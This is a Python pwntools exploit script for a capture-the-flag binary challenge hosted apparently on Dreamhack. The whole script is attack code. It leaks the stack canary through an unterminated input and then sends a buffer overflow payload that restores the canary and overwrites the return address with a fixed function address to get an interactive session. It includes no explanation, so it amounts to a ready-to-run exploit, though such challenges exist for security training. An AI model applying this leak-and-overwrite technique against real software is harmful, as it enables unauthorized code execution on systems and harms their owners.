#!/usr/bin/python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
# def GDB():
#     if not args.REMOTE:
#         gdb.attach(p, gdbscript='''
#         c
#         ''')
#         input()


if args.REMOTE:
    p = remote('host8.dreamhack.games', 9309)
else:
    p = process([exe.path])
# GDB()
sa(b'Enter name: ', b'A'*56)
sla(b'Enter age: ', b'1'*20)
sla(b'Enter height: ', b'1'*20)
payload = b'BBBBB'
sa(b'Enter M (Male) or F (Female): ', payload) 
p.recvuntil(b'B'*5)
canary = u64(b'\0' + p.recv(7))
log.info("canary :" + hex(canary))

payload = b'A' * 104
payload += p64(canary)
payload += p64(0)
payload += p64(0x0000000000401216)
sa(b'nationality? ', payload)



p.interactive()

